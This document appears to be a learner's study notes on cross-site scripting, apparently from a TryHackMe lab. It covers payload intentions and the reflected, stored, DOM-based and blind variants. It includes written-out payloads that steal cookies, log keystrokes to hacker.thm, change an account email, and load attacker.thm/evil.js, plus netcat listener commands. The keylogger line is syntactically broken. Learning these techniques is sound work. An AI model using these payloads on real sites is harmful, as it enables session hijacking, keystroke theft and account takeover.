In XSS, the payload is the **JavaScript** code we wish to be executed on the targets computer, there are two parts to the payload, the intention and the modification.

**Intention**: What you wish the JavaScript to actually do
**Modification:** Changes to the code we need to make it execute as every scenario is different.

- **XSS Intentions:**

**Proof of Concept:**
```HTML
<script>alert('XSS');</script>
```

Simplest of payloads where all you want to demonstrate is that you can achieve XSS on a website, often done by causing an alert box to pop up on the page with a string of text.

**Session stealing:**
Details of user's session, such as login tokens, are often kept in cookies on the targets machine, the below Javascript code takes the target's cookie, base6 encodes the cookie to ensuure a successful transmissison and then posts it to a website under the hacker's control to be logged.

Once the threat actor  has these cookies, they can take over the target's session and be logged as that user.

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Keylogger**
Anything you type on the webpage will be forwarded to a website under the hacker's control.

```javascript
document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=') + btoa(e.key) );}
```

**Business Logic**
Calling a particular network resource or Javascript function, like **user.changeEmail()**

```javascript
user.changeEmail('attacker@hacker.thm');
```

Now that the email address for the account ahs changed, the attacker may perform a reset password attack.

### Reflected XSS

Happens when user-supplied data in a **HTTP Request** is included in the webpage source without any validation.

```
https://website.thm/?error=Invalid Input Detected
```

```HTML
<div class="alert alert-danger">
	<p>Invalid Input Detected</p>
</div>
```

The application doesn't cheeck for the contents of the error parameter, which allows the attacker to insert malicious code.

```
https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>
```

```HTML
<div class= "alert alert-danger">
	<p><script src="https://attacker.thm/evil.js"></script></p>
</div>
```

### Stored XSS

XSS is stored on the web application( in a database for example) and then gets run when other users visit the site or a web page.

A blog website that allows users to post comments, these comments contain Javascript, it will be stored in the database and now every other user on the website will have the Javascript run in ther browser.

Can **redirect users, steal user's session cookie, perform other website actions** while acting as the visiting user.

### DOM Based XSS

Where the JavaScript execution happens **directly in the browser** without any new pages being loaded or data submitted to the backend code.

DOM Based XSS can be challenging to test, you'd need to look for **partos f the code that access certain variables** that an attacker can have control over, such as "**window.location.x**" parameters.

You need to check how they are handled whether these values are ver written to the web page's DOM or passed to unsafe JavaSCript methods such as **eval()**

### Blind XSS

Similar to **Stored XSS** in that your payload gets stored on the website for another user to view, but in this instance, you can't see the paylaod working or able to test it against yourself first.

When testing for BLind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request), this way you know if and when your code is being executed.

A popular tool for Blind XSS attacks is XSS Hunter Express, although it's possible to make your own tool in JS, this tool will automatically **capture cookies, URLs, page contents** and more.

### Using Netcat for XSS

If we want to listen on port 9001

```shell
nc -l -p 9001
```

**-l**: indicates that we want to use Netcat on **listen mode.** while the **-p** option is used to specify the port number.

```shell
nc -n -l -v -p 9001
```

**-n**: Avoids resolution of hostnames via DNS, **-v** adds verbose.

```shell
nc -nlvp 9001
```

